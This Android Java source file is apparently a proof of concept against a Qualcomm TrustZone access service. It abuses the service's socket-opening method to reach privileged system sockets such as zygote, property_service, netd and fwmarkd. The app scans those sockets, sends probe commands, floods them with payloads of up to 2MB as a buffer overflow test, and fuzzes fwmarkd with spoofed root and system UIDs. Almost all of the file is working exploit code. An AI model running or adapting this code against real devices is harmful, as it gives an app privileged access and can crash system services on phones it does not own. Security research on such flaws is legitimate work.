package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
    private static final String PROPERTY_SERVICE_PATH = "/dev/socket/property_service";
    private static final String FWMARKD_SOCKET_PATH = "/dev/socket/fwmarkd";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd mTZService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;
    private List<String> successSockets = new ArrayList<>();

    static {
        System.loadLibrary("pocjni");
    }

    public static native ParcelFileDescriptor nativeConnectSocket(IMinkSocketFd tzService, String path, int[] handleArr);
    public static native String nativeReadFile(String path);
    public static native int nativeSendLongData(ParcelFileDescriptor pfd, byte[] data, int len);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("[TZ] Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            stopRequested.set(false);
            testThread = new Thread(() -> executeFullTest());
            testThread.start();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("TZ disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        appendLog("========================================");
        appendLog("========== TZAccess Socket Scan ==========");

        String[] allSockets = {
            "/dev/socket/mdnsd",
            "/dev/socket/tcm",
            FWMARKD_SOCKET_PATH,
            "/dev/socket/dnsproxyd",
            "/dev/socket/logd",
            PROPERTY_SERVICE_PATH,
            "/dev/socket/ssgqmig",
            "/dev/socket/minksocket",
            "/dev/socket/netd",
            "/dev/socket/location",
            "/dev/socket/zygote",
            "/dev/socket/zygote_secondary"
        };

        for (String path : allSockets) {
            if (stopRequested.get()) break;
            testSocketJava(path);
        }

        appendLog("========== SUCCESSFUL SOCKETS (Java) ==========");
        if (successSockets.isEmpty()) {
            appendLog("  No successful sockets");
        } else {
            for (String s : successSockets) {
                appendLog("  " + s);
            }
        }

        appendLog("========== Testing via JNI ==========");
        if (mTZService != null && !successSockets.isEmpty()) {
            for (String path : successSockets) {
                if (stopRequested.get()) break;
                testSocketJNI(path);
            }
        } else {
            appendLog("  No successful sockets or TZ service null");
        }

        appendLog("========== JNI File Read Test ==========");
        String[] files = {"/proc/version", "/proc/self/status"};
        for (String f : files) {
            if (stopRequested.get()) break;
            try {
                String content = nativeReadFile(f);
                if (content != null && !content.isEmpty()) {
                    appendLog("[JNI] Read " + f + ": " + content.substring(0, Math.min(200, content.length())));
                } else {
                    appendLog("[JNI] Failed to read " + f + " (empty or null)");
                }
            } catch (Exception e) {
                appendLog("[JNI] Read " + f + " error: " + e.getMessage());
            }
        }

        if (!successSockets.isEmpty()) {
            appendLog("========== Interacting with successful sockets ==========");
            for (String s : successSockets) {
                if (stopRequested.get()) break;
                if (s.equals(PROPERTY_SERVICE_PATH) || s.equals(FWMARKD_SOCKET_PATH)) continue;
                interactWithSocket(s);
            }
        }

        if (!successSockets.isEmpty()) {
            appendLog("========== Buffer Overflow Test on ALL Sockets (with timeout) ==========");
            testBufferOverflowAllSockets();
        } else {
            appendLog("========== No successful sockets, skipping overflow test ==========");
        }

        if (successSockets.contains(FWMARKD_SOCKET_PATH)) {
            appendLog("========== Fwmarkd Protocol Fuzzing Test (with timeout) ==========");
            try {
                testFwmarkdProtocol();
            } catch (IOException e) {
                appendLog("[FW] IOException: " + e.getMessage());
            }
        }

        appendLog("========== ALL TESTS COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testSocketJava(String path) {
        appendLog("[SCAN-JAVA] Testing: " + path);
        if (mTZService == null) {
            appendLog("  TZ service null");
            return;
        }
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = mTZService.a(path, iArr);
            if (pfd == null) {
                appendLog("  [FAIL] No FD");
                return;
            }
            appendLog("  [SUCCESS] Got FD: " + iArr[0]);
            successSockets.add(path);
            pfd.close();
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("  Error: " + e.getMessage());
        }
    }

    private void testSocketJNI(String path) {
        appendLog("[SCAN-JNI] Testing: " + path);
        if (mTZService == null) {
            appendLog("  TZ service null");
            return;
        }
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = nativeConnectSocket(mTZService, path, iArr);
            if (pfd == null) {
                appendLog("  [FAIL] No FD from JNI");
                return;
            }
            appendLog("  [SUCCESS] JNI got FD: " + iArr[0]);
            pfd.close();
        } catch (Exception e) {
            appendLog("  JNI error: " + e.getMessage());
        }
    }

    private void interactWithSocket(String path) {
        appendLog("[INTERACT] " + path);
        ParcelFileDescriptor pfd = null;
        try {
            int[] iArr = new int[1];
            pfd = mTZService.a(path, iArr);
            if (pfd == null) {
                appendLog("  Re-connect failed");
                return;
            }
            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
            if (fdesc == null || !fdesc.valid()) {
                appendLog("  FD invalid");
                pfd.close();
                return;
            }

            OutputStream os = new FileOutputStream(fdesc);
            InputStream is = new FileInputStream(fdesc);

            String[] cmds = {"help", "status", "version", "getprop", "list", "dump", "\n"};
            for (String cmd : cmds) {
                if (stopRequested.get()) break;
                try {
                    os.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    String resp = readWithTimeout(is, 500);
                    if (resp != null && !resp.isEmpty()) {
                        appendLog("  CMD[" + cmd + "] -> " + resp);
                    } else {
                        appendLog("  CMD[" + cmd + "] -> (no response)");
                    }
                } catch (Exception e) {
                    appendLog("  CMD[" + cmd + "] error: " + e.getMessage());
                }
                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            }

            os.close();
            is.close();
            pfd.close();
        } catch (Exception e) {
            appendLog("  Interaction error: " + e.toString());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private String readWithTimeout(InputStream is, int timeoutMs) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        long start = System.currentTimeMillis();
        byte[] buffer = new byte[512];
        try {
            while (System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int len = is.read(buffer);
                    if (len > 0) baos.write(buffer, 0, len);
                    else break;
                } else {
                    Thread.sleep(30);
                }
            }
            return baos.toString(StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return null;
        }
    }

    private int readBytesWithTimeout(InputStream is, int timeoutMs, byte[] buffer, int offset, int length) {
        long start = System.currentTimeMillis();
        int totalRead = 0;
        try {
            while (totalRead < length && System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int n = is.read(buffer, offset + totalRead, length - totalRead);
                    if (n <= 0) break;
                    totalRead += n;
                } else {
                    Thread.sleep(30);
                }
            }
            return totalRead;
        } catch (Exception e) {
            return -1;
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "tz_jni_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ JNI PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "検査が終了したから終了しま~す", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 2000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }

    // ===== バッファオーバーフロー試験（全成功ソケット、タイムアウト付き） =====
    private void testBufferOverflowAllSockets() {
        int[] sizes = {1024 * 10, 1024 * 100, 1024 * 512, 1024 * 1024, 1024 * 1024 * 2};
        byte[] pattern = "hellooo".getBytes(StandardCharsets.UTF_8);
        ExecutorService executor = Executors.newSingleThreadExecutor();

        for (String path : successSockets) {
            if (stopRequested.get()) break;
            appendLog("[BOF] Testing socket: " + path);

            ParcelFileDescriptor pfd = null;
            try {
                int[] iArr = new int[1];
                pfd = mTZService.a(path, iArr);
                if (pfd == null) {
                    appendLog("[BOF] Failed to get FD for " + path);
                    continue;
                }

                boolean timeoutOccurred = false;
                for (int size : sizes) {
                    if (stopRequested.get() || timeoutOccurred) break;
                    appendLog("[BOF] Sending " + size + " bytes to " + path);
                    byte[] payload = new byte[size];
                    for (int i = 0; i < size; i++) {
                        payload[i] = pattern[i % pattern.length];
                    }
                    final ParcelFileDescriptor pfdFinal = pfd;
                    final byte[] payloadFinal = payload;
                    Future<Integer> future = executor.submit(new Callable<Integer>() {
                        @Override
                        public Integer call() throws Exception {
                            return nativeSendLongData(pfdFinal, payloadFinal, payloadFinal.length);
                        }
                    });
                    try {
                        int written = future.get(5000, TimeUnit.MILLISECONDS);
                        appendLog("[BOF] JNI write returned: " + written + " for size " + size);
                    } catch (TimeoutException e) {
                        appendLog("[BOF] Timeout writing " + size + " bytes to " + path);
                        future.cancel(true);
                        timeoutOccurred = true;
                        // タイムアウトが発生したらこのソケットは諦める
                        break;
                    } catch (Exception e) {
                        appendLog("[BOF] Error: " + e.getMessage());
                        timeoutOccurred = true;
                        break;
                    }
                    try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                }
            } catch (Exception e) {
                appendLog("[BOF] Error on " + path + ": " + e.toString());
            } finally {
                if (pfd != null) {
                    try { pfd.close(); } catch (Exception ignored) {}
                }
            }
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        }
        executor.shutdownNow();
    }

    // ===== fwmarkd プロトコルファジング試験（タイムアウト付き） =====
    private void testFwmarkdProtocol() throws IOException {
        appendLog("[FW] Starting fwmarkd protocol fuzzing test (timeout=2000ms)");

        int[] cmdIds = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,20,30,50,100,200,255};

        for (int cmdId : cmdIds) {
            if (stopRequested.get()) break;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            baos.write(cmdId & 0xFF);
            baos.write((cmdId >> 8) & 0xFF);
            baos.write((cmdId >> 16) & 0xFF);
            baos.write((cmdId >> 24) & 0xFF);
            for (int i = 0; i < 12; i++) baos.write(0);
            byte[] data = baos.toByteArray();
            int result = sendFwmarkCommandWithTimeout(data, 2000);
            appendLog("[FW] cmdId=" + cmdId + " -> result=" + result);
        }

        // ON_CONNECT (cmdId=1) with connectInfo
        {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            baos.write(1 & 0xFF); baos.write((1 >> 8) & 0xFF); baos.write((1 >> 16) & 0xFF); baos.write((1 >> 24) & 0xFF);
            for (int i = 0; i < 12; i++) baos.write(0);
            byte[] dummyAddr = new byte[128];
            dummyAddr[0] = 2;
            dummyAddr[2] = 0x50;
            dummyAddr[3] = 0;
            dummyAddr[4] = 127;
            dummyAddr[5] = 0;
            dummyAddr[6] = 0;
            dummyAddr[7] = 1;
            baos.write(dummyAddr);
            byte[] data = baos.toByteArray();
            int result = sendFwmarkCommandWithTimeout(data, 2000);
            appendLog("[FW] ON_CONNECT with connectInfo -> result=" + result);
        }

        // SELECT_NETWORK (cmdId=6) with various UIDs
        int[] testUids = {android.os.Process.myUid(), 0, 1000, 9999, 10000};
        for (int uid : testUids) {
            if (stopRequested.get()) break;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            baos.write(6 & 0xFF); baos.write((6 >> 8) & 0xFF); baos.write((6 >> 16) & 0xFF); baos.write((6 >> 24) & 0xFF);
            baos.write(uid & 0xFF); baos.write((uid >> 8) & 0xFF); baos.write((uid >> 16) & 0xFF); baos.write((uid >> 24) & 0xFF);
            baos.write(1 & 0xFF); baos.write(0); baos.write(0); baos.write(0);
            for (int i = 0; i < 4; i++) baos.write(0);
            byte[] data = baos.toByteArray();
            int result = sendFwmarkCommandWithTimeout(data, 2000);
            appendLog("[FW] SELECT_NETWORK uid=" + uid + " netId=1 -> result=" + result);
        }

        // 1KB random data
        byte[] bigData = new byte[1024];
        for (int i = 0; i < bigData.length; i++) bigData[i] = (byte) (i & 0xFF);
        int result4 = sendFwmarkCommandWithTimeout(bigData, 2000);
        appendLog("[FW] 1KB random data -> result=" + result4);

        // 20-byte data
        byte[] midData = new byte[20];
        for (int i = 0; i < midData.length; i++) midData[i] = (byte) (i & 0xFF);
        int result5 = sendFwmarkCommandWithTimeout(midData, 2000);
        appendLog("[FW] 20-byte data -> result=" + result5);

        appendLog("[FW] fwmarkd protocol fuzzing completed");
    }

    // タイムアウト付きで fwmarkd にコマンドを送信し、応答（int）を返す（タイムアウト時は -5 を返す）
    private int sendFwmarkCommandWithTimeout(byte[] data, int timeoutMs) {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = mTZService.a(FWMARKD_SOCKET_PATH, iArr);
            if (pfd == null) {
                appendLog("[FW] Failed to get FD");
                return -1;
            }
            java.io.FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[FW] Invalid FD");
                pfd.close();
                return -2;
            }

            final ParcelFileDescriptor pfdFinal = pfd;
            final byte[] dataFinal = data;
            Future<Integer> future = executor.submit(new Callable<Integer>() {
                @Override
                public Integer call() throws Exception {
                    OutputStream os = new FileOutputStream(pfdFinal.getFileDescriptor());
                    os.write(dataFinal);
                    os.flush();

                    InputStream is = new FileInputStream(pfdFinal.getFileDescriptor());
                    byte[] buf = new byte[4];
                    int read = readBytesWithTimeout(is, timeoutMs, buf, 0, 4);
                    if (read == 4) {
                        return (buf[0] & 0xFF) |
                               ((buf[1] & 0xFF) << 8) |
                               ((buf[2] & 0xFF) << 16) |
                               ((buf[3] & 0xFF) << 24);
                    } else {
                        return -5;
                    }
                }
            });

            try {
                return future.get(timeoutMs, TimeUnit.MILLISECONDS);
            } catch (TimeoutException e) {
                appendLog("[FW] Timeout while waiting for response");
                future.cancel(true);
                return -5;
            } catch (Exception e) {
                appendLog("[FW] Exception: " + e.getMessage());
                return -4;
            } finally {
                pfd.close();
            }
        } catch (Exception e) {
            appendLog("[FW] Exception: " + e.getMessage());
            return -4;
        } finally {
            executor.shutdownNow();
        }
    }
}
